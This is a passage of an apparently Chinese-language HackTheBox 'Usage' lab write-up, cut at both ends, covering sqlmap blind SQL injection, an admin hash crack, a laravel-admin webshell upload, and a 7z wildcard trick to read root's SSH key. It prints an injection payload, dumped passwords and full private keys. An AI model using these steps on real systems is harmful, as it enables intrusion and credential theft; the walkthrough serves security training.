URL</span></span><br><span class="line"><span class="string">got a 302 redirect to &#x27;</span>http://usage.htb/forget-password<span class="string">&#x27;. Do you want to follow? [Y/n] Y</span></span><br><span class="line"><span class="string">redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y</span></span><br><span class="line"><span class="string">[18:17:06] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y</span></span><br><span class="line"><span class="string">[18:17:07] [WARNING] heuristic (basic) test shows that POST parameter &#x27;</span>email<span class="string">&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[18:17:08] [INFO] testing for SQL injection on POST parameter &#x27;</span>email<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:17:08] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:18:24] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:19:27] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (NOT)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:20:37] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (subquery - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:21:04] [INFO] POST parameter &#x27;</span>email<span class="string">&#x27; appears to be &#x27;</span>AND boolean-based blind - WHERE <span class="keyword">or</span> HAVING clause (subquery - comment)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[18:21:11] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#x27;</span>MySQL<span class="string">&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">[18:21:11] [INFO] checking if the injection point on POST parameter &#x27;</span>email<span class="string">&#x27; is a false positive</span></span><br><span class="line"><span class="string">POST parameter &#x27;</span>email<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 362 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: email (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span></span><br><span class="line"><span class="string">    Payload: _token=qvFWdIi9mFtev8ejYNMyZe3E6kRHXo8gTdMGsZlv&amp;email=1&#x27;</span> AND <span class="number">7974</span>=(SELECT (CASE WHEN (<span class="number">7974</span>=<span class="number">7974</span>) THEN <span class="number">7974</span> ELSE (SELECT <span class="number">3858</span> UNION SELECT <span class="number">4992</span>) END))-- sKyy</span><br><span class="line">---</span><br><span class="line">[<span class="number">18</span>:<span class="number">21</span>:<span class="number">26</span>] [INFO] testing MySQL</span><br><span class="line">[<span class="number">18</span>:<span class="number">21</span>:<span class="number">27</span>] [INFO] confirming MySQL</span><br><span class="line">[<span class="number">18</span>:<span class="number">21</span>:<span class="number">29</span>] [INFO] the back-end DBMS <span class="keyword">is</span> MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Nginx <span class="number">1.18</span><span class="number">.0</span></span><br><span class="line">back-end DBMS: MySQL &gt;= <span class="number">8.0</span><span class="number">.0</span></span><br><span class="line">[<span class="number">18</span>:<span class="number">21</span>:<span class="number">30</span>] [WARNING] HTTP error codes detected during run:</span><br><span class="line"><span class="number">500</span> (Internal Server Error) - <span class="number">128</span> times</span><br><span class="line">[<span class="number">18</span>:<span class="number">21</span>:<span class="number">30</span>] [INFO] fetched data logged to text files under <span class="string">&#x27;/home/mane/.local/share/sqlmap/output/usage.htb&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ <span class="number">18</span>:<span class="number">21</span>:<span class="number">30</span> /<span class="number">2024</span>-04-<span class="number">14</span>/</span><br></pre></td></tr></table></figure>
+
+<p>然後就是常規操作啦：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump 一下數據庫有什麽：</span></span><br><span class="line">$ sqlmap -r forgot -p email --dbs --batch</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] usage_blog</span><br><span class="line"></span><br><span class="line"><span class="comment"># dump 一下所有的表</span></span><br><span class="line">$ sqlmap -r forgot -D usage_blog --tables --batch</span><br><span class="line">....</span><br><span class="line">admin_users  </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="comment"># 但是最有用的是admin_users， dump 出來看一下</span></span><br><span class="line">$ sqlmap -r forgot -D usage_blog -T admin_users  --dump --batch</span><br><span class="line">+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+                                                                                                                                                                 </span><br><span class="line">| <span class="built_in">id</span> | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                    </span><br><span class="line">                       |                                                                  </span><br><span class="line">+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+                                                                                                                                                                 </span><br><span class="line">| <span class="number">1</span>  | Administrator | &lt;blank&gt; | $2y$<span class="number">10</span>$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | <span class="number">2023</span>-08-<span class="number">13</span> 02:<span class="number">48</span>:<span class="number">26</span> | <span class="number">2024</span>-04-<span class="number">14</span> <span class="number">11</span>:07:<span class="number">38</span> | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |         </span><br><span class="line">+----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+ </span><br></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>​：請不要開啓多綫程模式，因爲是用的同一個cookie。</p>
+<h2 id="0x4-web-登錄"><a href="#0x4-web-登錄" class="headerlink" title="0x4 web 登錄"></a>0x4 web 登錄</h2><p>得到的hash 拿去 給 hashcat 跑一下，得到管理員的密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2y$10<span class="variable">$ohq2kLpBH</span>/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1</span><br></pre></td></tr></table></figure>
+
+<p>然後登陸後臺：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414185752-sa4e714.png" alt="image">​</p>
+<p>通過源碼可以發現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414205403-2grlnxa.png" alt="image">​</p>
+<p>搜索 <code>laravel-admin exploit</code>​ 找到了<a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-g857-47pm-3r32"> laravel-admin has Arbitrary File Upload vulnerability</a>，其中有用的連接是：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://flyd.uk/post/cve-2023-24249/">https://flyd.uk/post/cve-2023-24249/</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/z-song/laravel-admin/issues/5726">https://github.com/z-song/laravel-admin/issues/5726</a></li>
+</ul>
+<p>根據這兩篇的提示，準備一個webshell，把後綴名改成 <code>shell.php.jpg</code>​ ，然後在上傳頭像的地方用上傳這個webshell，并用burp進行修改後綴名：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212230-6k5ztw6.png" alt="image">​</p>
+<p>上傳完成后會得到這樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212341-tws4ml2.png" alt="image">​</p>
+<p>右鍵開啓新的選項卡你就得到了一個webshell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414190600-dhnvtq9.png" alt="image">​</p>
+<p>這個webshell會被定時刪除，看到是機器裏面的用戶，才嘗試使用ssh，來到 <code>~/.ssh</code>​ 看到有 id_rsa，直接扒下來使用ssh登錄：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">dash@usage:~/.ssh$ <span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA3TGrilF/7YzwawPZg0LvRlkEMJSJQxCXwxT+kY93SpmpnAL0U73Y</span><br><span class="line">RnNLYdwGVjYbO45FtII1B/MgQI2yCNrxl/1Z1JvRSQ97T8T9M+xmxLzIhFR4HGI4HTOnGQ</span><br><span class="line">doI30dWka5nVF0TrEDL4hSXgycsTzfZ1NitWgGgRPc3l5XDmzII3PsiTHrwfybQWjVBlql</span><br><span class="line">QWKmVzdVoD6KNotcYgjxnGVDvqVOz18m0ZtFkfMbkAgUAHEHOrTAnDmLY6ueETF1Qlgy4t</span><br><span class="line">iTI/l452IIDGdhMGNKxW/EhnaLaHqlGGwE93cI7+Pc/6dsogbVCEtTKfJfofBxM0XQ97Op</span><br><span class="line">LLZjLuj+iTfjIc+q6MKN+Z3VdTTmjkTjVBnDqiNAB8xtu00yE3kR3qeY5AlXlz5GzGrD2X</span><br><span class="line">M1gAml6w5K74HjFn/X4lxlzOZxfu54f/vkfdoL808OIc8707N3CvVnAwRfKS70VWELiqyD</span><br><span class="line">7seM4zmM2kHQiPHy0drZ/wl6RQxx2dAd87AbAZvbAAAFgGobXvlqG175AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAN0xq4pRf+2M8GsD2YNC70ZZBDCUiUMQl8MU/pGPd0qZqZwC9FO92EZzS2HcBlY2</span><br><span class="line">GzuORbSCNQfzIECNsgja8Zf9WdSb0UkPe0/E/TPsZsS8yIRUeBxiOB0zpxkHaCN9HVpGuZ</span><br><span class="line">1RdE6xAy+IUl4MnLE832dTYrVoBoET3N5eVw5syCNz7Ikx68H8m0Fo1QZapUFiplc3VaA+</span><br><span class="line">ijaLXGII8ZxlQ76lTs9fJtGbRZHzG5AIFABxBzq0wJw5i2OrnhExdUJYMuLYkyP5eOdiCA</span><br><span class="line">xnYTBjSsVvxIZ2i2h6pRhsBPd3CO/j3P+nbKIG1QhLUynyX6HwcTNF0PezqSy2Yy7o/ok3</span><br><span class="line">4yHPqujCjfmd1XU05o5E41QZw6ojQAfMbbtNMhN5Ed6nmOQJV5c+Rsxqw9lzNYAJpesOSu</span><br><span class="line">+B4xZ/1+JcZczmcX7ueH/75H3aC/NPDiHPO9Ozdwr1ZwMEXyku9FVhC4qsg+7HjOM5jNpB</span><br><span class="line">0Ijx8tHa2f8JekUMcdnQHfOwGwGb2wAAAAMBAAEAAAGABhXWvVBur49gEeGiO009HfdW+S</span><br><span class="line">ss945eTnymYETNKF0/4E3ogOFJMO79FO0js317lFDetA+c++IBciUzz7COUvsiXIoI4PSv</span><br><span class="line">FMu7l5EaZrE25wUX5NgC6TLBlxuwDsHja9dkReK2y29tQgKDGZlJOksNbl9J6Om6vBRa0D</span><br><span class="line">dSN9BgVTFcQY4BCW40q0ECE1GtGDZpkx6vmV//F28QFJZgZ0gV7AnKOERK4hted5xzlqvS</span><br><span class="line">OQzjAQd2ARZIMm7HQ3vTy+tMmy3k1dAdVneXwt+2AfyPDnAVQfmCBABmJeSrgzvkUyIUOJ</span><br><span class="line">ZkEZhOsYdlmhPejZoY/CWvD16Z/6II2a0JgNmHZElRUVVf8GeFVo0XqSWa589eXMb3v/M9</span><br><span class="line">dIaqM9U3RV1qfe9yFdkZmdSDMhHbBAyl573brrqZ+Tt+jkx3pTgkNdikfy3Ng11N/437hs</span><br><span class="line">UYz8flG2biIf4/qjgcUcWKjJjRtw1Tab48g34/LofevamNHq7b55iyxa1iJ75gz8JZAAAA</span><br><span class="line">wQDN2m/GK1WOxOxawRvDDTKq4/8+niL+/lJyVp5AohmKa89iHxZQGaBb1Z/vmZ1pDCB9+D</span><br><span class="line">aiGYNumxOQ8HEHh5P8MkcJpKRV9rESHiKhw8GqwHuhGUNZtIDLe60BzT6DnpOoCzEjfk9k</span><br><span class="line">gHPrtLW78D2BMbCHULdLaohYgr4LWsp6xvksnHtTsN0+mTcNLZU8npesSO0osFIgVAjBA6</span><br><span class="line">6blOVm/zpxsWLNx6kLi41beKuOyY9Jvk7zZfZd75w9PGRfnc4AAADBAOOzmCSzphDCsEmu</span><br><span class="line">L7iNP0RHSSnB9NjfBzrZF0LIwCBWdjDvr/FnSN75LZV8sS8Sd/BnOA7JgLi7Ops2sBeqNF</span><br><span class="line">SD05fc5GcPmySLO/sfMijwFYIg75dXBGBDftBlfvnZZhseNovdTkGTtFwdN+/bYWKN58pw</span><br><span class="line">JSb7iUaZHy80a06BmhoyNZo4I0gDknvkfk9wHDuYNHdRnJnDuWQVfbRwnJY90KSQcAaHhM</span><br><span class="line">tCDkmmKv42y/I6G+nVoCaGWJHpyLzh7QAAAMEA+K8JbG54+PQryAYqC4OuGuJaojDD4pX0</span><br><span class="line">s1KWvPVHaOOVA54VG4KjRFlKnPbLzGDhYRRtgB0C/40J3gY7uNdBxheO7Rh1Msx3nsTT9v</span><br><span class="line">iRSpmo2FKJ764zAUVuvOJ8FLyfC20B4uaaQp0pYRgoA5G2BxjtWnCCjvr2lnj/J3BmKcz/</span><br><span class="line">b2e7L0VKD4cNk9DsAWwagAK2ZRHlQ5J60udocmNBEugyGe8ztkRh1PYCB8W1Jqkygc8kpT</span><br><span class="line">63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x5-shell-as-dash"><a href="#0x5-shell-as-dash" class="headerlink" title="0x5 shell as dash"></a>0x5 shell as dash</h2><p>跑了一下linpeas，發現了數據庫密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  Analyzing Env Files (limit 70)                                                                                                                                                </span></span><br><span class="line">-rwxrwxr-x 1 dash dash 1176 Aug 23  2023 /var/www/html/project_admin/.env                                                                                                                                                                                                                                                                                   </span><br><span class="line">DB_USERNAME=staff                                                                                                                                                                          </span><br><span class="line">DB_PASSWORD=s3cr3t_c0d3d_1uth   </span><br></pre></td></tr></table></figure>
+
+<p>linpeas 沒什麽值得有趣的地方，看到了 <code>.config</code>​ 裏面有東西，於是在家目錄搜索一下密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dash@usage:~$ grep <span class="string">&quot;admin&quot;</span> -Ri . -l</span><br><span class="line">./.monitrc</span><br><span class="line">./.config/composer/vendor/laravel/prompts/playground/select.php</span><br><span class="line">./.cache/composer/repo/https---repo.packagist.org/provider-encore~laravel-admin.json</span><br><span class="line">./.cache/composer/repo/https---repo.packagist.org/provider-encore~laravel-admin~dev.json</span><br><span class="line">./.cache/composer/files/encore/laravel-admin/fc9b6137ab1272a0c6f5ab26f4b2ccc12ed74310.zip</span><br></pre></td></tr></table></figure>
+
+<p>逐個逐個看，看到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dash@usage:~$ <span class="built_in">cat</span> ./.monitrc</span><br><span class="line"><span class="comment">#Monitoring Interval in Seconds</span></span><br><span class="line"><span class="built_in">set</span> daemon  60</span><br><span class="line"></span><br><span class="line"><span class="comment">#Enable Web Access</span></span><br><span class="line"><span class="built_in">set</span> httpd port 2812</span><br><span class="line">     use address 127.0.0.1</span><br><span class="line">     allow admin:3nc0d3d_pa$<span class="variable">$w0rd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Apache</span></span><br><span class="line">check process apache with pidfile <span class="string">&quot;/var/run/apache2/apache2.pid&quot;</span></span><br><span class="line">    <span class="keyword">if</span> cpu &gt; 80% <span class="keyword">for</span> 2 cycles <span class="keyword">then</span> alert</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#System Monitoring </span></span><br><span class="line">check system usage</span><br><span class="line">    <span class="keyword">if</span> memory usage &gt; 80% <span class="keyword">for</span> 2 cycles <span class="keyword">then</span> alert</span><br><span class="line">    <span class="keyword">if</span> cpu usage (user) &gt; 70% <span class="keyword">for</span> 2 cycles <span class="keyword">then</span> alert</span><br><span class="line">        <span class="keyword">if</span> cpu usage (system) &gt; 30% <span class="keyword">then</span> alert</span><br><span class="line">    <span class="keyword">if</span> cpu usage (<span class="built_in">wait</span>) &gt; 20% <span class="keyword">then</span> alert</span><br><span class="line">    <span class="keyword">if</span> loadavg (1min) &gt; 6 <span class="keyword">for</span> 2 cycles <span class="keyword">then</span> alert </span><br><span class="line">    <span class="keyword">if</span> loadavg (5min) &gt; 4 <span class="keyword">for</span> 2 cycles <span class="keyword">then</span> alert</span><br><span class="line">    <span class="keyword">if</span> swap usage &gt; 5% <span class="keyword">then</span> alert</span><br><span class="line"></span><br><span class="line">check filesystem rootfs with path /</span><br><span class="line">       <span class="keyword">if</span> space usage &gt; 80% <span class="keyword">then</span> alert</span><br></pre></td></tr></table></figure>
+
+<p>得到一個密碼 <code>3nc0d3d_pa$$w0rd</code>​，然後通過 passwd 查看用戶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dash@usage:~$ <span class="built_in">cat</span> /etc/passwd | grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">dash:x:1000:1000:dash:/home/dash:/bin/bash</span><br><span class="line">xander:x:1001:1001::/home/xander:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>能登陸的有三個用戶，除了 dash 試下另外兩個用戶：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dash@usage:~$ su xander</span><br><span class="line">Password: </span><br><span class="line">xander@usage:/home/dash$ <span class="built_in">id</span></span><br><span class="line">uid=1001(xander) gid=1001(xander) <span class="built_in">groups</span>=1001(xander)</span><br></pre></td></tr></table></figure>
+
+<p>結果是 <code>xander</code>​ 的密碼。</p>
+<h2 id="0x6-shell-as-xander"><a href="#0x6-shell-as-xander" class="headerlink" title="0x6 shell as xander"></a>0x6 shell as xander</h2><p>隨手 <code>sudo -l</code>​ 看看有什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xander@usage:/home/dash$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> xander on usage:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User xander may run the following commands on usage:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/usage_management</span><br></pre></td></tr></table></figure>
+
+<p>思路就很明顯了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xander@usage:/home/dash$ file /usr/bin/usage_management</span><br><span class="line">/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>是個elf文件，所以下載下來反編譯看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212800-bh4ut3i.png" alt="image">​</p>
+<p>儅選擇第一個選項的時候：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414212814-w98ih2u.png" alt="image">​</p>
+<p>調用 <code>7za</code>​ 去壓縮文件，但是 <code>7za</code>​ 有一個 <code>*</code>​ ，於是就查一下有沒有相關的利用：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/04-yi4NE15dru9I27nr-Usage/image-20240414213021-pr5f9pl.png" alt="image">​</p>
+<p>找到了這個：</p>
+<blockquote>
+<p>In <strong>7z</strong> even using <code>--</code>​ before <code>*</code>​ (note that <code>--</code>​ means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z</a></p>
+</blockquote>
+<p>所以可以：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xander@usage:/var/www/html$ <span class="built_in">cd</span> /var/www/html</span><br><span class="line">xander@usage:/var/www/html$ <span class="built_in">touch</span> @root.txt</span><br><span class="line">xander@usage:/var/www/html$ <span class="built_in">echo</span> <span class="string">&quot;/root/.ssh/id_rsa&quot;</span> &gt; root.txt</span><br><span class="line">xander@usage:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line">project_admin  @root.txt  root.txt  usage_blog</span><br></pre></td></tr></table></figure>
+
+<p>然後執行備份命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">xander@usage:/var/www/html$ sudo /usr/bin/usage_management</span><br><span class="line">Choose an option:</span><br><span class="line">1. Project Backup</span><br><span class="line">2. Backup MySQL data</span><br><span class="line">3. Reset admin password</span><br><span class="line">Enter your choice (1/2/3): 1</span><br><span class="line"></span><br><span class="line">7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)</span><br><span class="line"></span><br><span class="line">Open archive: /var/backups/project.zip</span><br><span class="line">--   </span><br><span class="line">Path = /var/backups/project.zip</span><br><span class="line">Type = zip</span><br><span class="line">Physical Size = 54846894</span><br><span class="line"></span><br><span class="line">Scanning the drive:</span><br><span class="line">2984 folders, 17946 files, 113879109 bytes (109 MiB)                       </span><br><span class="line"></span><br><span class="line">Updating archive: /var/backups/project.zip</span><br><span class="line"></span><br><span class="line">Items to compress: 20930</span><br><span class="line">                                          </span><br><span class="line">Files <span class="built_in">read</span> from disk: 17946</span><br><span class="line">Archive size: 54846883 bytes (53 MiB)</span><br><span class="line">Everything is Ok</span><br></pre></td></tr></table></figure>
+
+<p>拷貝到 <code>/tmp</code>​ 解壓就得到 root 的 id_rsa：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">xander@usage:/tmp$ <span class="built_in">cp</span> /var/backups/project.zip /tmp</span><br><span class="line">xander@usage:/tmp$ unzip project.zip</span><br><span class="line">xander@usage:/tmp$ <span class="built_in">ls</span></span><br><span class="line">id_rsa         snap-private-tmp                                                                  systemd-private-0ad8559231a3449da8f17f16a5509716-systemd-timesyncd.service-x80auL</span><br><span class="line">project_admin  systemd-private-0ad8559231a3449da8f17f16a5509716-ModemManager.service-WZ7nkf      tmux-1000</span><br><span class="line">project.zip    systemd-private-0ad8559231a3449da8f17f16a5509716-systemd-logind.service-ON7guW    usage_blog</span><br><span class="line">root.txt       systemd-private-0ad8559231a3449da8f17f16a5509716-systemd-resolved.service-OvJIp7  vmware-root_789-4290756532</span><br><span class="line"></span><br><span class="line">xander@usage:/tmp$ <span class="built_in">cat</span> id_rsa </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi</span><br><span class="line">QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q</span><br><span class="line">AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs</span><br><span class="line">H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">xander@usage:/tmp$ <span class="built_in">cat</span> root.txt </span><br><span class="line">/root/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>使用設個 id_rsa 登錄你就得到了 root：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i id_rsa root@10.129.211.55</span><br><span 